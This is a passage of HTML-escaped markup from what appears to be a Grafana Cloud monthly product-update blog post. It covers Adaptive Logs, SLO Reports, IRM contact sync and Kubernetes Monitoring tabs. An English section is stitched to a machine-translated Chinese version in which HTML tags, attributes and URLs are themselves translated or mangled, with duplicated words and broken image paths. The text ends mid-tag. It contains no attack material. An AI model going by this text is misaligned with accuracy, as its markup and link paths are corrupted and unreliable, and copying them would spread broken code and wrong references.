ingested log patterns. From there, it creates customized recommendations for dropping unused telemetry, allowing you to reduce observability costs and focus on the signals that truly matter.&lt;/p&gt;&#xA;&lt;p&gt;This month, we rolled out a new feature in Adaptive Logs that lets you filter for early detection patterns, so you can identify and remove ingest spikes quickly. Now generally available, this early-detection tool allows you to proactively ensure only the most valuable telemetry is shipped to Grafana Cloud.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/adaptive-metrics/Screenshot-2025-05-27-at-12.16.51%e2%80%afPM.png?w=1920&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/adaptive-metrics/Screenshot-2025-05-27-at-12.16.51%e2%80%afPM.png?w=1920&#34;alt=&#34;A screenshot of the early detection patterns feature in Adaptive Logs.&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/adaptive-metrics/Screenshot-2025-05-27-at-12.16.51%e2%80%afPM.png?w=1920&#34;&#xA;alt=&#34;A screenshot of the early detection patterns feature in Adaptive Logs.&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;To view early detection patterns, use the &lt;strong&gt;Show early detection patterns&lt;/strong&gt; toggle. The toggle also shows you the number of early patterns available. You can learn more in our&#xA;&lt;a href=&#34;/docs/grafana-cloud/cost-management-and-billing/adaptive-telemetry/adaptive-logs/manage-recommendations/#view-early-detection-patterns&#34;&gt;Adaptive Logs docs&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;grafana-slo-reports&#34;&gt;Grafana SLO Reports&lt;/h2&gt;&#xA;&lt;p&gt;&#xA;&lt;a href=&#34;/products/cloud/slo/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana SLO&lt;/a&gt; — an application that makes it easy to create, manage, and scale service level objectives, SLO dashboards, and error budget alerts in Grafana Cloud — includes a powerful new feature to report on multiple SLOs on a weekly or monthly basis. &lt;/p&gt;&#xA;&lt;p&gt;You can use these new SLO Reports to:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Consolidate multiple SLOs into a single, easy-to-digest report&lt;/li&gt;&#xA;&lt;li&gt;View individual and combined SLI (Service Level Indicator) metrics&lt;/li&gt;&#xA;&lt;li&gt;Understand weighted contributions of each SLO to the overall SLI performance&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;SLO Reports make it easier to monitor trends over time, share insights with stakeholders, and prioritize reliability efforts across high-impact services.&lt;/p&gt;&#xA;&lt;p&gt;To read more, and create your report today, please check out our&#xA;&lt;a href=&#34;/docs/grafana-cloud/alerting-and-irm/slo/reports/&#34;&gt;technical docs&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;syncing-contacts-in-grafana-irm-mobile-app&#34;&gt;Syncing contacts in Grafana IRM mobile app&lt;/h2&gt;&#xA;&lt;p&gt;With the&#xA;&lt;a href=&#34;/docs/grafana-cloud/alerting-and-irm/irm/use/irm-mobile-app/&#34;&gt;Grafana IRM mobile app&lt;/a&gt;, you can sync the phone numbers used by Grafana IRM to your mobile device’s contacts. This makes it easier to recognize IRM calls and optionally allow them to override Do Not Disturb (DnD) or silent mode for urgent alerts.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 783px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png&#34;data-srcset=&#34;/media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png?w=320 320w, /media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png?w=550 550w, /media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png?w=750 750w, /media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png?w=900 900w, /media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png?w=1040 1040w, /media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png?w=1240 1240w, /media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A screenshot of option to sync contacts in the Grafana IRM mobile app.&#34;width=&#34;783&#34;height=&#34;1600&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/docs/grafana-cloud/alerting-and-irm/screenshot-contact-sync.png&#34;&#xA;alt=&#34;A screenshot of option to sync contacts in the Grafana IRM mobile app.&#34;width=&#34;783&#34;height=&#34;1600&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;You can learn more about this new feature in our&#xA;&lt;a href=&#34;/docs/grafana-cloud/alerting-and-irm/irm/manage/notifications/phone-and-sms/#sync-irm-phone-numbers-to-your-contacts&#34;&gt;technical docs&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;streamlined-navigation-via-the-observability-menu&#34;&gt;Streamlined navigation via the Observability menu &lt;/h2&gt;&#xA;&lt;p&gt;We’ve updated the main navigation in Grafana Cloud to bring all observability tools together under a single menu called &lt;strong&gt;Observability&lt;/strong&gt;. You’ll now find&#xA;&lt;a href=&#34;/products/cloud/application-observability/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud Application Observability&lt;/a&gt;,&#xA;&lt;a href=&#34;/products/cloud/frontend-observability-for-real-user-monitoring/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Frontend Observability&lt;/a&gt;,&#xA;&lt;a href=&#34;/solutions/kubernetes/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Kubernetes Monitoring&lt;/a&gt;,&#xA;&lt;a href=&#34;/docs/grafana-cloud/monitor-infrastructure/monitor-cloud-provider/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Cloud Provider Observability&lt;/a&gt;, and more grouped in one place.&lt;/p&gt;&#xA;&lt;p&gt;This change is part of our effort to provide:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;A simpler, more consistent experience across observability tools&lt;/li&gt;&#xA;&lt;li&gt;Faster access to relevant signals and workflows&lt;/li&gt;&#xA;&lt;li&gt;A foundation for deeper, context-aware troubleshooting&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Stay tuned — more improvements will follow soon.&lt;/p&gt;&#xA;&lt;h2 id=&#34;new-in-enterprise-data-sources-logicmonitor&#34;&gt;New in Enterprise data sources: LogicMonitor&lt;/h2&gt;&#xA;&lt;p&gt;The LogicMonitor Devices data source plugin enables you to query and visualize &lt;code&gt;Device Instance Data&lt;/code&gt;, and to list &lt;code&gt;Devices&lt;/code&gt;, &lt;code&gt;Datasources&lt;/code&gt;, and &lt;code&gt;Instances&lt;/code&gt;, directly within Grafana Cloud. &lt;/p&gt;&#xA;&lt;p&gt;Learn more about using and installing the LogicMonitor data source in our&#xA;&lt;a href=&#34;/docs/plugins/grafana-logicmonitor-datasource/latest/&#34;&gt;documentation&lt;/a&gt;. And to learn more about our Enterprise data sources, in general, please refer to&#xA;&lt;a href=&#34;/blog/2024/05/13/grafana-enterprise-data-source-plugins-a-brief-guide-to-what-they-are-and-how-to-get-started/&#34;&gt;this guide&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt; is the easiest way to get started with incident response and management. We have a generous forever-free tier and plans for every use case.&#xA;&lt;a href=&#34;/auth/sign-up/create-user?pg=blog&amp;amp;redirectPath=irm&#34;&gt;Sign up for free now&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;】&lt;p&gt;我们始终在Grafana Cloud中推出有用的更新和有趣的功能，Grafana Cloud是由开源Grafana LGTM堆栈提供支持的完全管理的可观察性平台（&#xA;&lt;a href =“/oss/loki/？pg = blog＆plcmt = body-txt”&gt; loki &lt;/a&gt;用于日志，&#xA;&lt;a href =“/oss/grafana/？pg = blog＆plcmt = body-txt”&gt; grafana &lt;/a&gt;用于可视化，&#xA;&lt;a href =“/oss/tempo/？pg = blog＆plcmt = body-txt”&gt; tempo &lt;/a&gt;用于痕迹，并且&#xA;&lt;a href =“/oss/mimir/？pg = blog＆plcmt = body-txt”&gt; mimir &lt;/a&gt;用于指标）。&lt;/p&gt;&#xA;&lt;p&gt;如果您错过了他们，这是我们每月对最新，最出色的Grafana Cloud更新的综述。您还可以阅读有关我们在我们的Grafana Cloud中添加的所有功能&#xA;&lt;a href =“/docs/grafana-cloud/whats-new/？pg = blog＆plcmt = body-txt”&gt; grafana云文档中有什么新功能&lt;/a&gt;。&lt;/p&gt;&#xA;&lt;p&gt;，如果您还不是Grafana Cloud用户，&#xA;&lt;a href =“/auth/ige-up/create-user/？pg = blog＆plcmt = body-txt”&gt;签署&lt;/a&gt;今天的帐户！您可以通过我们慷慨的无云计划免费尝试任何这些功能（以及更多）。&lt;/p&gt;&#xA;&lt;h2 id =“更深入的象征”&gt; kubernetes监视中的更深入见解&lt;/h2&gt;&#xA;&lt;p&gt;我们的&#xA;&lt;a href =“/solutions/kubernetes/？pg = blog＆plcmt = body-txt/“&gt; kubernetes监视&lt;/a&gt; grafana cloud中的解决方案使您能够在Kubernetes群集上可视化和警报，以便您可以识别根本原因，以确定根本原因，优化资源使用，并降低成本，并降低成本。本月，我们为简化导航和故障排除添加了新功能。&lt;/p&gt;&#xA;在&#xA;&lt;p&gt;从任何详细信息页面中，单击&lt;strong&gt;日志和事件&lt;/strong&gt;选项卡，以轻松找到该特定kubernetes对象的日志和事件。您可以过滤几个维度，包括：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;时间段&lt;/li&gt;&#xA;&lt;li&gt;组件&lt;/li&gt;&#xA;&lt;li&gt;云区域&lt;/li&gt;&#xA;&lt;li&gt;错误级别&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/docs/grafana-cloud/k8s/logs-table-cluster.png？w = 1920”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/docs/grafana-cloud/k8s/logs-table-cluster.png？w = 1920“ alt =” kubernetes群集的日志表的屏幕截图。”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/docs/grafana-cloud/k8s/logs-table-cluster.png？w = 1920”&#xA;alt =“ kubernetes群集的日志表的屏幕截图。”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;此外，您现在可以在工作负载主页上使用过滤器快速查找&#xA;&lt;a href =“/docs/grafana-cloud/Monitor-Infrastructure/kubernetes-monitoring/navigate-k8s-monitoring/＃discover-non-standard-workloads”&gt; non-standard workloads &lt;/a&gt;。这些非标准工作负载的过滤器包括：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt; Argo推出&lt;/li&gt;&#xA;&lt;li&gt; Strimzi Pod Sets &lt;/li&gt;&#xA;&lt;li&gt;未管理（或静态）豆荚&lt;/li&gt;&#xA;&lt;li&gt; cronjobs &lt;/li&gt;&#xA;&lt;li&gt;裸露的豆荚&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;图&#xA;class =“图形 -  wrappe-wrappeR__LIGHTBOX W-100P”&#xA;样式=“最大宽度：670px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/docs/grafana-cloud/k8s/workload-type-sort.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/docs/grafana-cloud/k8s/workload-type-sort.png” data-srcset =“/媒体/docs/grafana-cloud/k8s/workload-type-type-type-sort.png？ 550w，/media/Docs/grafana-cloud/k8s/workload-type-sort.png?w=750 750W，/media/Docs/grafana-cloud/k8s/workload-load-type-ypepe-sort.png？w=900 900w， /Media/docs/grafana-cloud/k8s/workload-type-sort.png?w=1040 1040W，/media/docs/grafana-cloud/k8s/workload-load-type-sort.png？ /Media/docs/grafana-cloud/k8s/workload-type-sort.png?w=1920W = 1920W“&#xA;data-sizes =“ auto” alt =“用于非标准工作负载的过滤器的屏幕截图。” width =“ 670” height =“ 802”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/docs/grafana-cloud/k8s/workload-type-sort.png”&#xA;alt =“用于非标准工作负载的过滤器的屏幕截图。” width =“ 670”高度=“ 802”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;h3 id =“  -  with-with-with-memory and-cpu-tabs”&gt;使用内存和CPU选项卡进行故障排除&lt;/h3&gt;&#xA;&lt;p&gt;在Kubernetes监视中的任何详细页面上，您可以看到CPU和内存使用范围的概述。您现在也可以单击&lt;strong&gt;内存&lt;/strong&gt;或&lt;strong&gt; cpu &lt;/strong&gt; &lt;strong&gt; tab &lt;/strong&gt;查看更多相关的用法信息。 &lt;/p&gt;&#xA;&lt;p&gt;“内存”选项卡及其面板可在容器级别以外的任何详细信息页面上访问。现在，您可以与其他相关数据点一起查看内存使用量，例如，这些工作负载对命名空间的内存使用量最大的贡献。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/docs/grafana-cloud/k8s/workspace-memory-panels.png？w = 1920”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/docs/grafana-cloud/k8s/workspace-memory-panels.png？w = 1920“ alt =” kubernetes监视中内存使用面板的屏幕截图。”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/docs/grafana-cloud/k8s/workspace-memory-panels.png？w = 1920”&#xA;alt =“ Kubernetes监视中的内存使用面板的屏幕截图。”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;同时，CPU选项卡除了容器页面以外的每个详细信息页面上提供了有见地的面板，以实现更快的故障排除和更好的资源计划。通过利用效率图和CPU分布分析，您可以从群集到POD获得更深的可见性。&lt;/p&gt;。&#xA;&lt;p&gt;例如，您可以使用CPU选项卡来获得容量大小的见解以优化性能。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：2074px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ lightb牛链接”&#xA;href =“/媒体/docs/grafana-cloud/k8s/cputab.gif”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/docs/grafana-cloud/k8s/cputab.gif” alt =“ a gif显示cpu tab。” width =“ 2074” height =“ 1656”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/docs/grafana-cloud/k8s/cputab.gif”&#xA;alt =“ gif显示CPU选项卡。” width =“ 2074”高度=“ 1656”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;您可以在我们的CPU和内存选项卡中了解更多信息&#xA;&lt;a href =“/docs/grafana-cloud/Monitor-Infrasture/kubernetes-monitoring/navigate-k8s-monitoring/？pg = blog＆plcmt = body-txt/＃cpu-and-and-ememory-tabs“&gt; kubernetes”&gt; kubernetes监视文档&lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;H2 ID =“ Grafana-fleet-Managements中的新功能”&gt; Grafana Fleet Management &lt;/h2&gt;的新功能&#xA;&lt;p&gt; in&#xA;&lt;a href =“/docs/grafana-cloud/send-data/send-data/fleet-management/？pg = blog＆plcmt = body-txt”&gt; grafana fleet管理&lt;/a&gt;，一种grafana云解决方案，使您可以按比例管理收藏家的部署，使我们能够缩放与恢复和重复使用的新功能有关，并将其推出了新功能。&#xA;&lt;H3 ID =“ Restore-Pipeline-versions”&gt;还原管道版本&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;a href =“/docs/grafana-cloud/send-data/send-data/fleet-management/manage-fleet/pipelines/view-pipeline-history/”&gt;管道历史记录&lt;/a&gt;现在，车队管理中的功能现在提供了还原现有配置管道的版本的选项。从&lt;strong&gt;历史详细信息&lt;/strong&gt;页面中，选择一个版本，然后单击&lt;strong&gt;还原&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;p&gt;这是其工作原理：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;还原管道版本覆盖当前管道的配置。&lt;/li&gt;&#xA;&lt;li&gt;恢复的管道设置为与覆盖管道相同的活动状态或不活动状态。&lt;/li&gt;&#xA;&lt;li&gt;恢复管道版本时，也可以恢复其匹配属性，或者可以在还原版本中持续存在覆盖管道中的匹配属性。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1999px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/grafana-cloud-updates-june-june-2025/restore pipipelines-fleet-management.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/grafana-cloud-updates-june-2025/reterore-pipelines-fleet-management.png” data-srcset =“/媒体/blog/blog/grafana-cloud-updates-june-2025/reterore-pipelore-pipelores-pipelines-pipelines-fleet-management.png？ /Media/Blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=550 550W，/media/Blog/grafana-cloud-updates-june-2025/restore-pipelines-pipelines-pipelines-pipelines-fleet-management-management.png？ /Media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=900 900W，/media/Blog/grafana-cloud-poddates-june-2025/restore-pipelines-pipelines-pipelines-pipelines-fleet-management-management.png？ /Media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=1240 1240W，/媒体/blog/blog/grafana-cloud-updates-updates-june-june-2025/rethore-pipelines-fleet-management.png？w = 1920 1920w“&#xA;data-sizes =“ auto” alt =“车队管理中的还原管道功能的屏幕截图。” width =“ 1999”高度=“ 1087”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/grafana-cloud-updates-june-june-2025/restore pipipelines-fleet-management.png”&#xA;alt =“船队管理中的还原管道功能的屏幕截图。” width =“ 1999”高度=“ 1087”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;H3 ID =“可重复使用的Pipeline-components”&gt;可重复使用的管道组件&lt;/h3&gt;&#xA;&lt;p&gt; Grafana车队管理中的管道现在可以利用&#xA;&lt;a href =“/oss/Alloy-opentelemetry-collector/？pg = blog＆plcmt = body-txt”&gt; grafana Alloy &lt;/a&gt; &lt;code&gt; export&gt; enter&gt; grom&gt; grobort &lt;/code&gt; block &lt;/code&gt;与其他管道共享其组件。 &lt;/p&gt;&#xA;&lt;p&gt;与&#xA;&lt;a href =“/docs/docs/grafana-cloud/send-data/fleet-management/intep/configuration-pipelines/pipeline-export-inpoction/“”&gt;管道导出注入&lt;/a&gt;，您可以从一种配置管道中导出组件，并使用另一种配置管道将其注射到语法中&lt;code&gt; grigent.pipeline_exports.value [“ pipeline_name”]] [“ export_name”] &lt;/code&gt;。此功能强大的功能使您可以创建适应每个管道的导出值的动态配置，从而允许灵活和可重复使用的管道配置。&lt;/p&gt;&#xA;&lt;p&gt;您可以在我们的&#xA;&lt;a href =“/docs/grafana-cloud/send-data/fleet-management/manage-fleet/pipelines/view-pipeline-history/？pg = blog＆plcmt = body-txt = body-txt”&gt;车队管理技术文档&lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;H2 ID =“ RBAC-IN-INTHETIC-MONITORINITINIT”&gt; RBAC在合成监测中&lt;/h2&gt;&#xA;&lt;p&gt;现在通常可用，RBAC&#xA;&lt;a href =“/products/cloud/coldthetic-monitoring/？pg = blog＆plcmt = body-txt”&gt; grafana云综合监视&lt;/a&gt;允许您微调访问和权限，因此您可以更加控制谁可以访问特定功能。您可以为用户和团队分配不同的角色和权限，以确保合适的人拥有正确的访问权限。 &lt;/p&gt;&#xA;&lt;p&gt;这使管理监视工作流程更加安全和灵活。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/doc/nocs/nythetic-monitoring/rbac1.png？w = 1240”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/doc/nocs/synthetic-monitoring/rbac1.png？w = 1240“ alt =”合成监视中的RBAC配置的屏幕截图。”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/doc/nocts/synthetic-monitoring/rbac1.png？w = 1240”&#xA;alt =“合成监视中的RBAC配置的屏幕截图。”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;要了解有关如何在合成监控中分配角色的更多信息，请查看我们的&#xA;&lt;a href =“/docs/grafana/最终/管理/roles-and-permissions/access-control/toss-rbac-roles/？pg = blog＆plcmt = body-txt = body-txt”&gt;文档&lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;h2 id =“自适应日志的早期 - 检测模式”&gt;自适应日志的早期检测模式&lt;/h2&gt;&#xA;&lt;p&gt;&#xA;&lt;a href =“/docs/grafana-cloud/coSt-Management-and填充/自适应 - 仪表/自适应 -  logs //？PG = blog＆plcmt = body-txt“&gt;自适应日志&lt;/a&gt;是一种Grafana云功能，它使用AI/ML技术来分析可观察性的数据，以分析可观察性数据，从而允许使用常见的图案，以便您从中识别出可观的指标，以便您的定制量身定制，以供您定制的doppections。专注于真正重要的信号。&lt;/p&gt;&#xA;&lt;p&gt;本月，我们在自适应日志中推出了一项新功能，该功能使您可以过滤以获取早期检测模式，因此您可以快速识别和删除插入峰值。现在通常可用，此早期检测工具使您可以主动确保只有最有价值的遥测器才能运送到Grafana Cloud。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/自适应 - 元素/屏幕截图-2025-05-27-AT-12.16.51％e2％e2％80％afpm.png？w = 1920”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/自适应 - 元素/屏幕截图-2025-05-27-AT-12.16.51％E2％E2％80％afpm.png？&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/自适应 - 元素/屏幕截图-2025-05-27-22.16.51％e2％e2％80％afpm.png？w = 1920”&#xA;alt =“自适应日志中早期检测模式的屏幕截图。”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;要查看早期检测模式，请使用&lt;strong&gt;显示早期检测模式&lt;/strong&gt;切换。该切换还向您显示可用的早期模式的数量。您可以在我们的&#xA;&lt;a href =“/docs/grafana-cloud/cost-management-and-billing/audaptive-telemetry/audaptive-logs/manage-recmmendations/＃view-early-early-tectection-tetection-patterns&gt;自适应日志文档docs docs &lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;H2 ID =“ Grafana-Slo-Reports”&gt; Grafana SLO Reports &lt;/h2&gt;&#xA;&lt;p&gt;&#xA;&lt;a href =“/products/cloud/slo/？pg = blog＆plcmt = body-txt”&gt; grafana slo &lt;/a&gt;  - 一个应用程序，该应用程序使得易于创建，管理和规模服务水平的目标，SLO仪表板和GRAFANA云中的错误预算警报 - 在Grafana Cloud中 - 包括一个强大的新功能，可以在每周或一个月的基础上报告多个SLO。 &lt;/p&gt;&#xA;&lt;p&gt;您可以将这些新的SLO报告用于：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;将多个SLO合并为单个，易于消化的报告&lt;/li&gt;&#xA;&lt;li&gt;查看个人和组合的SLI（服务级指标）指标&lt;/li&gt;&#xA;&lt;li&gt;了解每个SLO对整体SLI性能的加权贡献&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt; SLO报告使随着时间的流逝监视趋势，与利益相关者分享见解变得更加容易，并优先考虑高影响力服务的可靠性工作。&lt;/p&gt;&#xA;&lt;p&gt;要阅读更多，并立即创建您的报告，请查看我们的&#xA;&lt;a href =“/docs/docs/grafana-cloud/nervering-and-inm/slo/revorys/”&gt;技术文档&lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;H2 ID =“ Grafana irm移动应用程序中的同步 - 触发器 - 在Grafana-mimbile-app”&gt;同步联系人&lt;/h2&gt;&#xA;&lt;p&gt;与&#xA;&lt;a href =“/docs/docs/grafana-cloud/nervering and-inm/irm/irm/use/irM-Mobile-app/“&gt; Grafana IRM移动应用程序&lt;/a&gt;，您可以将Grafana IRM使用的电话号码同步到移动设备的联系人中。这使得更容易识别IRM呼叫，并且可选地允许它们覆盖不加工（DND）或无声警报模式。&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：783px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/docs/grafana-cloud/arterning and-nirs/screenshot-contactsync.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/docs/grafana-cloud/artering-sirn/screenshot-contact-sync.png“ data-srcset =”/媒体/docs/docs/grafana-cloud/artering------ anding-mirning-and-inm/screenshot-contact-contact-sync.png？ /Media/docs/grafana-cloud/alerting-and-mirm/screenshot-contact-sync.png?w=550 550W，/media/docs/grafana-cloud/alerting/alerting-and-mirm/screenshot-creenshot-contact-contact-contact-sync.png，png，png?w=750 750w，750w，750w，750w，750w，750w，750w， /Media/docs/grafana-cloud/alerting-and-mirm/screenshot-contact-sync.png?w=900 900W，/media/docs/grafana-cloud/alerting/alerting-and-mirm/screenshot-creenshot-contact-contact-contact-sync-sync.png，png?w=1040 1040w， /Media/docs/grafana-cloud/alerting-and-mirm/screenshot-contact-sync.png?w=1240 1240W，/media/docs/grafana-cloud/alerting/alerting-and-mirm/screenshot-contact-contact-contact-sync-sync.png?w-png?w=19202010w“&#xA;data-sizes =“ auto” alt =“在Grafana IRM移动应用中同步联系人的选项屏幕截图。“ width =“ 783” height =“ 1600”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/docs/grafana-cloud/arterning-mind/screts-contenshot-contactsync.png”&#xA;alt =“ Grafana IRM移动应用中同步联系人的选项屏幕截图。” width =“ 783” height =“ 